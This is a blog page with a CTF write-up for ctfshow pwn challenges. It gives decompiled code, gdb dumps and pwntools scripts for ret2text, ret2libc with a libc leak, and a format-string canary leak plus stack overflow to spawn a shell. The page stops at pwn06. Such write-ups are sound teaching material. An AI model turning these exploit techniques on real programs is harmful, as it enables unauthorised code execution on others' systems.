<!DOCTYPE html>
<html class="writer-html5" lang="zh-CN" >
<head>
  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ctfshow-pwn &mdash; eclaircy&#39;s blog 1.0 文档</title>
      <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
      <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
  <!--[if lt IE 9]>
    <script src="_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
        <script src="_static/jquery.js"></script>
        <script src="_static/underscore.js"></script>
        <script src="_static/_sphinx_javascript_frameworks_compat.js"></script>
        <script src="_static/doctools.js"></script>
        <script src="_static/translations.js"></script>
    <script src="_static/js/theme.js"></script>
    <link rel="index" title="索引" href="genindex.html" />
    <link rel="search" title="搜索" href="search.html" />
    <link rel="prev" title="ONE hello" href="test2.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
            <a href="index.html" class="icon icon-home"> eclaircy's blog
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="在文档中搜索" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="test1.html">ONE hello</a></li>
<li class="toctree-l1"><a class="reference internal" href="test2.html">ONE hello</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">ctfshow-pwn</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#pwn02-ret2text">pwn02: ret2text</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pwn03-ret2libc">pwn03: ret2libc</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pwn04-foramt-string">pwn04: foramt string</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pwn05">pwn05</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pwn06">pwn06</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pwn07-64-ropgadget-ret2libc">pwn07: 64-ROPgadget-ret2libc</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pwn08-64-ret2text-stack-balance-todo">pwn08: 64-ret2text-stack balance [TODO]</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pwn10">pwn10</a></li>
<li class="toctree-l2"><a class="reference internal" href="#integer-overflow">数学99: Integer Overflow[不董]</a></li>
<li class="toctree-l2"><a class="reference internal" href="#id1">签退</a></li>
</ul>
</li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="index.html">eclaircy's blog</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="index.html" class="icon icon-home"></a> &raquo;</li>
      <li>ctfshow-pwn</li>
      <li class="wy-breadcrumbs-aside">
            <a href="_sources/ctfshow-pwn.md.txt" rel="nofollow"> 查看页面源码</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="ctfshow-pwn">
<h1>ctfshow-pwn<a class="headerlink" href="#ctfshow-pwn" title="此标题的永久链接"></a></h1>
<section id="pwn02-ret2text">
<h2>pwn02: ret2text<a class="headerlink" href="#pwn02-ret2text" title="此标题的永久链接"></a></h2>
<p>exploit: return to the backdoor function <code class="docutils literal notranslate"><span class="pre">stack</span></code> by overflowing the variable <code class="docutils literal notranslate"><span class="pre">s</span></code> in function <code class="docutils literal notranslate"><span class="pre">pwnme</span></code> .</p>
<p>vulnerable point: pwnme uses buffer overflowing function <code class="docutils literal notranslate"><span class="pre">fgets</span></code>. The vulnerable point is variable s, it has only 9 bytes, but can be writen with 50 bytes.</p>
<p><img alt="image-20221010195722627" src="C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010195722627.png" /></p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#0x804850f  system(&#39;/bin/sh&#39;)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;pwn.challenge.ctf.show&quot;</span><span class="p">,</span><span class="mi">28108</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">13</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804850f</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
</section>
<section id="pwn03-ret2libc">
<h2>pwn03: ret2libc<a class="headerlink" href="#pwn03-ret2libc" title="此标题的永久链接"></a></h2>
<ul class="simple">
<li><p>decompile <code class="docutils literal notranslate"><span class="pre">pwnme</span></code></p></li>
</ul>
<p>exploit:</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">pwnme</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [esp+Fh] [ebp-9h]</span>

  <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p><strong>First exp:</strong></p>
<ul class="simple">
<li><p>payload:</p>
<ul>
<li><p>‘A’*(9+4) 	[overflow variable <code class="docutils literal notranslate"><span class="pre">s</span></code> and <code class="docutils literal notranslate"><span class="pre">ebp</span></code>]</p></li>
<li><p>puts_plt     [ret addr of <code class="docutils literal notranslate"><span class="pre">pwnme()</span></code>]</p></li>
<li><p>main_addr     [ret addr after <code class="docutils literal notranslate"><span class="pre">puts()</span></code>]</p></li>
<li><p>put_got       [arg of <code class="docutils literal notranslate"><span class="pre">puts()</span></code>]</p></li>
</ul>
</li>
<li><p>Leak the real addr of <code class="docutils literal notranslate"><span class="pre">puts</span></code> in memory.</p></li>
<li><p>Leak the libc version by <code class="docutils literal notranslate"><span class="pre">LibcSearcher</span></code> tools.</p></li>
<li><p>Get the offset of <code class="docutils literal notranslate"><span class="pre">puts</span></code> of this libc version.</p></li>
<li><p>Get the real addr of the start of libc in memorylibc_real_base = puts_real_addr - puts_offset</p></li>
<li><p>Get the real addr of <code class="docutils literal notranslate"><span class="pre">system()</span></code> and  string <code class="docutils literal notranslate"><span class="pre">'/bin/sh'</span></code>  in memory:</p>
<ul>
<li><p>system_real = libc_real_base + system_offset</p></li>
<li><p>binsh_real = libc_real_base + binsh_offset</p></li>
</ul>
</li>
</ul>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># first exp</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwn3</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./pwn3&quot;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn3&quot;</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>

<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;main&quot;</span><span class="p">]</span>

<span class="n">first_payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">9</span> <span class="o">+</span> <span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> 

<span class="n">pwn3</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">first_payload</span><span class="p">)</span>
<span class="c1"># if now prints 0x63617473</span>
<span class="n">pwn3</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">puts_real_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">pwn3</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>  
<span class="nb">print</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_real_addr</span><span class="p">))</span> <span class="c1"># 0xf7de9cb0  starts with &quot;f7&quot; =&gt; addr in libc</span>
</pre></div>
</div>
<ul class="simple">
<li><p>[notice]  There is “\n\n” in  <code class="docutils literal notranslate"><span class="pre">pwn3.recvuntil(&quot;\n\n&quot;)</span></code>   because when it jump to execute main again, it will recieve <code class="docutils literal notranslate"><span class="pre">'stack</span> <span class="pre">happy!\n'</span> </code> and <code class="docutils literal notranslate"> <span class="pre">'32bits\n'</span></code> .</p></li>
</ul>
<p>Here is the result of exp1:</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span>giantbranch@ubuntu:~/Desktop$ python pwn2.py
<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./pwn3&#39;</span>: pid <span class="m">5530</span>
<span class="o">[</span>DEBUG<span class="o">]</span> PLT 0x8048370 fgets
<span class="o">[</span>DEBUG<span class="o">]</span> PLT 0x8048380 puts
<span class="o">[</span>DEBUG<span class="o">]</span> PLT 0x8048390 __libc_start_main
<span class="o">[</span>DEBUG<span class="o">]</span> PLT 0x80483a0 setvbuf
<span class="o">[</span>DEBUG<span class="o">]</span> PLT 0x80483b0 __gmon_start__
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/giantbranch/Desktop/pwn3&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
<span class="o">[</span>DEBUG<span class="o">]</span> Received 0x15 bytes:
    <span class="s1">&#39;stack happy!\n&#39;</span>
    <span class="s1">&#39;32bits\n&#39;</span>
    <span class="s1">&#39;\n&#39;</span>
0x63617473
<span class="o">[</span>DEBUG<span class="o">]</span> Sent 0x1a bytes:
    <span class="m">00000000</span>  <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span>  <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span>  <span class="m">41</span> <span class="m">42</span> <span class="m">42</span> <span class="m">42</span>  <span class="m">42</span> <span class="m">80</span> <span class="m">83</span> <span class="m">04</span>  │AAAA│AAAA│ABBB│B···│
    <span class="m">00000010</span>  <span class="m">08</span> df <span class="m">84</span> <span class="m">04</span>  <span class="m">08</span> <span class="m">10</span> a0 <span class="m">04</span>  <span class="m">08</span> 0a                     │····│····│··│
    0000001a
<span class="o">[</span>DEBUG<span class="o">]</span> Received 0x22 bytes:
    <span class="m">00000000</span>  b0 7c d8 f7  <span class="m">50</span> <span class="m">05</span> d4 f7  <span class="m">70</span> <span class="m">83</span> d8 f7  0a <span class="m">73</span> <span class="m">74</span> <span class="m">61</span>  │·<span class="p">|</span>··│P···│p···│·sta│
    <span class="m">00000010</span>  <span class="m">63</span> 6b <span class="m">20</span> <span class="m">68</span>  <span class="m">61</span> <span class="m">70</span> <span class="m">70</span> <span class="m">79</span>  <span class="m">21</span> 0a <span class="m">33</span> <span class="m">32</span>  <span class="m">62</span> <span class="m">69</span> <span class="m">74</span> <span class="m">73</span>  │ck h│appy│!·32│bits│
    <span class="m">00000020</span>  0a 0a                                               │··│
    <span class="m">00000022</span>
0xf7d87cb0
<span class="o">[</span>*<span class="o">]</span> Stopped process <span class="s1">&#39;./pwn3&#39;</span> <span class="o">(</span>pid <span class="m">5530</span><span class="o">)</span>
</pre></div>
</div>
<p><strong>Second exp:</strong></p>
<ul class="simple">
<li><p>payload:</p>
<ul>
<li><p>‘A’*(9+4) 			[overflow variable <code class="docutils literal notranslate"><span class="pre">s</span></code> and <code class="docutils literal notranslate"><span class="pre">ebp</span></code>]</p></li>
<li><p>system_addr        [ret addr of <code class="docutils literal notranslate"><span class="pre">pwnme()</span></code>]</p></li>
<li><p>0xdeadbeef          [ret addr after <code class="docutils literal notranslate"><span class="pre">system()</span></code>]</p></li>
<li><p>binsh_addr           [arg of <code class="docutils literal notranslate"><span class="pre">binsh()</span></code>]</p></li>
</ul>
</li>
</ul>
</section>
<section id="pwn04-foramt-string">
<h2>pwn04: foramt string<a class="headerlink" href="#pwn04-foramt-string" title="此标题的永久链接"></a></h2>
<p><strong>checksec :</strong></p>
<ul class="simple">
<li><p>NX</p></li>
<li><p>Canary    [Canary is enabled to check if buffer overflow occurs. ]</p></li>
</ul>
<p><strong>exploit:</strong></p>
<ul class="simple">
<li><p><code class="docutils literal notranslate"><span class="pre">read</span></code> function: buffer overflow</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">printf</span></code> : format string vulnerable leak canary</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">getshell</span></code> : backdoor function</p></li>
</ul>
<p><strong>About Canary</strong></p>
<p>The function of  <code class="docutils literal notranslate"><span class="pre">__readgsdword(0x14u)</span></code>  is to read the value in gs register with offset 0x14  ([gs:0x14] stores the value of canary)  and  stores the canary value to <code class="docutils literal notranslate"><span class="pre">v3</span></code> .</p>
<p>The function of  <code class="docutils literal notranslate"><span class="pre">__readgsdword(0x14u)</span> <span class="pre">^</span> <span class="pre">v3</span></code>  is to xor the value of <code class="docutils literal notranslate"><span class="pre">v3</span></code> and <code class="docutils literal notranslate"><span class="pre">[gs:0x14]</span></code> to find if overflow occured. If the result is 0, no overflow happened. Else, call the <code class="docutils literal notranslate"><span class="pre">_stack_chk_fail</span></code> function.</p>
<p>The size of  string  <code class="docutils literal notranslate"><span class="pre">buf</span></code>  is 0x70 - 0xc = 0x64 = (100)DEC .</p>
<ul class="simple">
<li><p>ret addr</p></li>
<li><p>ebp</p></li>
<li><p>xxxx    4byte</p></li>
<li><p>xxxx   4byte</p></li>
<li><p>canary v3  4byte</p></li>
<li><p>buf</p></li>
<li><p>buf</p></li>
<li><p>…</p></li>
<li><p>buf</p></li>
</ul>
<p>send  100 %p</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">vuln</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-74h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-70h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+6Ch] [ebp-Ch]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x200u</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>input <code class="docutils literal notranslate"><span class="pre">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span></code> and the stack layer be like :</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="mi">0000</span><span class="o">|</span> <span class="mh">0xffffcf7c</span> <span class="o">--&gt;</span> <span class="mh">0x804866a</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
<span class="mi">0004</span><span class="o">|</span> <span class="mh">0xffffcf80</span> <span class="o">--&gt;</span> <span class="mh">0xffffcf98</span> <span class="p">(</span><span class="s2">&quot;AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><span class="se">\n</span><span class="s2">.</span><span class="se">\346\367</span><span class="s2">`m</span><span class="se">\373\367\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="mi">0008</span><span class="o">|</span> <span class="mh">0xffffcf84</span> <span class="o">--&gt;</span> <span class="mh">0xffffcf98</span> <span class="p">(</span><span class="s2">&quot;AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><span class="se">\n</span><span class="s2">.</span><span class="se">\346\367</span><span class="s2">`m</span><span class="se">\373\367\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="mi">0012</span><span class="o">|</span> <span class="mh">0xffffcf88</span> <span class="o">--&gt;</span> <span class="mh">0x200</span> 
<span class="mi">0016</span><span class="o">|</span> <span class="mh">0xffffcf8c</span> <span class="o">--&gt;</span> <span class="mh">0xf7e6d3bc</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">_IO_new_file_overflow</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">add</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x148c44</span><span class="p">)</span>
<span class="mi">0020</span><span class="o">|</span> <span class="mh">0xffffcf90</span> <span class="o">--&gt;</span> <span class="mh">0xf7fb6000</span> <span class="o">--&gt;</span> <span class="mh">0x1b2db0</span> 
<span class="mi">0024</span><span class="o">|</span> <span class="mh">0xffffcf94</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="mi">0028</span><span class="o">|</span> <span class="mh">0xffffcf98</span> <span class="p">(</span><span class="s2">&quot;AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><span class="se">\n</span><span class="s2">.</span><span class="se">\346\367</span><span class="s2">`m</span><span class="se">\373\367\n</span><span class="s2">&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p>0xffffcf80 stores the addr of our input format string, and is the start addr of <code class="docutils literal notranslate"><span class="pre">printf</span></code></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb-peda$ x/50w 0xffffcf80
0xffffcf80:	0xffffcf98	0xffffcf98	0x00000200	0xf7e6d3bc
0xffffcf90:	0xf7fb6000	0x00000000	0x41414141	0x70257025
0xffffcfa0:	0x70257025	0x70257025	0x70257025	0x70257025
0xffffcfb0:	0x70257025	0x70257025	0x70257025	0xf7e62e0a
0xffffcfc0:	0xf7fb6d60	0x0000000a	0x0000000d	0xf7e69000
0xffffcfd0:	0xf7fe77eb	0xf7e02700	0x00000000	0xf7fb6d60
0xffffcfe0:	0xffffd028	0xf7fee010	0xf7e62cbb	0x00000000
0xffffcff0:	0xf7fb6000	0xf7fb6000	0xffffd028	0xc5f04d00
0xffffd000:	0x08048768	0x00000000	0xffffd028	0x080486c1
0xffffd010:	0x00000001	0xffffd0d4	0xffffd0dc	0xc5f04d00
0xffffd020:	0xf7fb63dc	0xffffd040	0x00000000	0xf7e1b647
0xffffd030:	0xf7fb6000	0xf7fb6000	0x00000000	0xf7e1b647
0xffffd040:	0x00000001	0xffffd0d4
</pre></div>
</div>
<p>Stop after <code class="docutils literal notranslate"><span class="pre">mov</span>&#160;&#160;&#160; <span class="pre">eax,DWORD</span> <span class="pre">PTR</span> <span class="pre">[ebp-0xc]</span></code> executed. The value of eax is 0xc5f04d00 , which should be the canary value.</p>
<p>Find the offset of  0xc5f04d00 (canary address) in the former result, it is the 31th parameter of the format string AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p .</p>
<p><strong>Payload</strong>: <code class="docutils literal notranslate"><span class="pre">AAAA%31$p</span>&#160; </code></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span>gdb-peda$ n

<span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
EAX: 0xc5f04d00 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf7fb7870 --&gt; 0x0 
ESI: 0xf7fb6000 --&gt; 0x1b2db0 
EDI: 0xf7fb6000 --&gt; 0x1b2db0 
EBP: 0xffffd008 --&gt; 0xffffd028 --&gt; 0x0 
ESP: 0xffffcf90 --&gt; 0xf7fb6000 --&gt; 0x1b2db0 
EIP: 0x804867b <span class="o">(</span>&lt;vuln+77&gt;:	xor    eax,DWORD PTR gs:0x14<span class="o">)</span>
EFLAGS: 0x202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap</span> INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
   0x8048675 &lt;vuln+71&gt;:	jle    0x8048648 &lt;vuln+26&gt;
   0x8048677 &lt;vuln+73&gt;:	nop
   0x8048678 &lt;vuln+74&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
<span class="o">=</span>&gt; 0x804867b &lt;vuln+77&gt;:	xor    eax,DWORD PTR gs:0x14
   0x8048682 &lt;vuln+84&gt;:	je     0x8048689 &lt;vuln+91&gt;
   0x8048684 &lt;vuln+86&gt;:	call   0x8048450 &lt;__stack_chk_fail@plt&gt;
   0x8048689 &lt;vuln+91&gt;:	leave  
   0x804868a &lt;vuln+92&gt;:	ret
<span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
<span class="m">0000</span><span class="p">|</span> 0xffffcf90 --&gt; 0xf7fb6000 --&gt; 0x1b2db0 
<span class="m">0004</span><span class="p">|</span> 0xffffcf94 --&gt; 0x2 
<span class="m">0008</span><span class="p">|</span> 0xffffcf98 <span class="o">(</span><span class="s2">&quot;AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n.\346\367`m\373\367\n&quot;</span><span class="o">)</span>
<span class="m">0012</span><span class="p">|</span> 0xffffcf9c <span class="o">(</span><span class="s2">&quot;%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n.\346\367`m\373\367\n&quot;</span><span class="o">)</span>
<span class="m">0016</span><span class="p">|</span> 0xffffcfa0 <span class="o">(</span><span class="s2">&quot;%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n.\346\367`m\373\367\n&quot;</span><span class="o">)</span>
<span class="m">0020</span><span class="p">|</span> 0xffffcfa4 <span class="o">(</span><span class="s2">&quot;%p%p%p%p%p%p%p%p%p%p%p%p\n.\346\367`m\373\367\n&quot;</span><span class="o">)</span>
<span class="m">0024</span><span class="p">|</span> 0xffffcfa8 <span class="o">(</span><span class="s2">&quot;%p%p%p%p%p%p%p%p%p%p\n.\346\367`m\373\367\n&quot;</span><span class="o">)</span>
<span class="m">0028</span><span class="p">|</span> 0xffffcfac <span class="o">(</span><span class="s2">&quot;%p%p%p%p%p%p%p%p\n.\346\367`m\373\367\n&quot;</span><span class="o">)</span>
<span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
Legend: code, data, rodata, value
0x0804867b <span class="k">in</span> vuln <span class="o">()</span>
</pre></div>
</div>
<p><strong>exploit</strong></p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;pwn.challenge.ctf.show&quot;</span><span class="p">,</span><span class="mi">28112</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn4&quot;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&quot;i386&quot;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s2">&quot;linux&quot;</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Hello Hacker!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;%31$p&quot;</span><span class="p">)</span>
<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
<span class="n">getshell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;getshell&quot;</span><span class="p">]</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">100</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">getshell</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
</section>
<section id="pwn05">
<h2>pwn05<a class="headerlink" href="#pwn05" title="此标题的永久链接"></a></h2>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Arch:     i386-32-little
NX:       NX enabled
</pre></div>
</div>
<p><strong>Functions</strong></p>
<ul class="simple">
<li><p>welcome()</p>
<ul>
<li><p>gets()   the size of variable string s is 0x14</p></li>
</ul>
</li>
<li><p>getFlag(): Backdoor function</p></li>
</ul>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">welcome</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-14h]</span>

  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p>no param | ret addr of welcome | old ebp |  char s |</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;pwn.challenge.ctf.show&quot;</span><span class="p">,</span> <span class="mi">28110</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn5&quot;</span><span class="p">)</span>
<span class="n">backdoor</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;getFlag&quot;</span><span class="p">]</span>
<span class="n">payload</span><span class="o">=</span><span class="s2">&quot;a&quot;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x14</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
</section>
<section id="pwn06">
<h2>pwn06<a class="headerlink" href="#pwn06" title="此标题的永久链接"></a></h2>
<p>checksec: NX</p>
<p>file: ELF 64 bit</p>
